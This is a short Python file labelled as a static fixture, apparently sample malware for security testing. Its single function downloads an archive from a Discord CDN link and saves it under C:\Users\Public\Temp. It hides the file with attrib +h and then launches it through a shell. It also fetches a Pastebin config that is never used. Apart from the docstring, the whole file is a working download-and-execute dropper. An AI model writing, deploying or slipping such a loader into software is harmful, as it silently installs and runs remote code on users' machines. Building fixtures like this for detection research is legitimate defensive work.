"""Static fixture for a Pastebin-selected hidden archive launcher."""

import os
from subprocess import Popen
import requests


def stage_payload():
    response = requests.get("https://pastebin.com/raw/example-config")
    archive_url = "https://cdn.discordapp.com/attachments/123456789012345678/987654321098765432/update.zip"
    payload = requests.get(archive_url)
    destination = r"C:\Users\Public\Temp\cache.zip"
    with open(destination, "wb") as output:
        output.write(payload.content)
    os.system(f"attrib +h {destination}")
    Popen(f"python {destination}", shell=True)
